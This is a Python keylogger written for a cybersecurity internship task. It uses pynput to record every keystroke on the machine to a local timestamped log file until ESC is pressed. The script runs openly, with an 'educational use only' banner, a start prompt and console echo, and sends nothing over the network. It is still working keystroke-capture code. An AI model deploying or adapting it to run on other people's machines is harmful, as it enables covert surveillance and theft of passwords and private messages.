# ============================================================
# Task 4 - Keylogger Demo Tool
# Prodigy InfoTech Cybersecurity Internship
# Author: Anjali Kunwar Simari
#
# install: pip install pynput
# run: python keylogger.py
# stop: press ESC
# note: only use this on your own computer
# ============================================================

import datetime
import os
import threading
from pynput import keyboard

try:
    LOG_FOLDER = os.path.dirname(os.path.abspath(__file__))
except NameError:
    LOG_FOLDER = os.getcwd()

lock     = threading.Lock()
log_file = None

SPECIAL_KEY_MAP = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\n",
    keyboard.Key.tab:       "[TAB] ",
    keyboard.Key.backspace: "[BACKSPACE] ",
    keyboard.Key.shift_l:   "[SHIFT] ",
    keyboard.Key.shift_r:   "[SHIFT] ",
    keyboard.Key.ctrl_l:    "[CTRL] ",
    keyboard.Key.ctrl_r:    "[CTRL] ",
    keyboard.Key.alt_l:     "[ALT] ",
    keyboard.Key.alt_r:     "[ALT] ",
    keyboard.Key.caps_lock: "[CAPS] ",
    keyboard.Key.delete:    "[DEL] ",
    keyboard.Key.up:        "[UP] ",
    keyboard.Key.down:      "[DOWN] ",
    keyboard.Key.left:      "[LEFT] ",
    keyboard.Key.right:     "[RIGHT] ",
    keyboard.Key.f1:  "[F1] ",  keyboard.Key.f2:  "[F2] ",
    keyboard.Key.f3:  "[F3] ",  keyboard.Key.f4:  "[F4] ",
    keyboard.Key.f5:  "[F5] ",  keyboard.Key.f6:  "[F6] ",
    keyboard.Key.f7:  "[F7] ",  keyboard.Key.f8:  "[F8] ",
    keyboard.Key.f9:  "[F9] ",  keyboard.Key.f10: "[F10] ",
    keyboard.Key.f11: "[F11] ", keyboard.Key.f12: "[F12] ",
}


def format_key(key):
    if hasattr(key, "char") and key.char not in (None, ""):
        return key.char
    if key in SPECIAL_KEY_MAP:
        return SPECIAL_KEY_MAP[key]
    key_name = str(key).replace("Key.", "").strip("<>").upper()
    return f"[{key_name}] "


def save_to_file(text):
    global log_file
    with lock:
        if log_file is None:
            return
        try:
            log_file.write(text)
            log_file.flush()
        except Exception as e:
            print(f"[ERROR] write failed: {e}")


def on_press(key):
    if key == keyboard.Key.esc:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_to_file(f"\n\n--- logging stopped at {ts} ---\n")
        print("\n[STOPPED] ESC pressed.")
        return False
    try:
        formatted = format_key(key)
        print(formatted, end="", flush=True)
        save_to_file(formatted)
    except Exception as e:
        print(f"[ERROR] could not process key: {e}")


def main():
    global log_file

    print("=" * 50)
    print("  Keylogger Demo - Educational Use Only")
    print("=" * 50)
    print()
    print("  Logs keystrokes on this machine only.")
    print("  No data is sent over the network.")
    print("  Use only on your own system.")
    print()

    try:
        input("  Press ENTER to start or Ctrl+C to cancel: ")
    except KeyboardInterrupt:
        print("\n  Cancelled.")
        return

    now      = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"log_{now}.txt"
    filepath = os.path.join(LOG_FOLDER, filename)

    try:
        log_file = open(filepath, "a", encoding="utf-8")
    except OSError as e:
        print(f"[ERROR] could not open log file: {e}")
        return

    start = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    save_to_file(f"--- session started at {start} ---\n\n")

    print(f"\n  Logging started. Saving to: {filename}")
    print("  Press ESC to stop.\n")

    with keyboard.Listener(on_press=on_press, suppress=False) as listener:
        listener.join()

    with lock:
        if log_file is not None:
            try:
                log_file.flush()
                log_file.close()
            except:
                pass
            log_file = None

    print(f"\n  Log saved to: {filepath}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n  Stopped.")
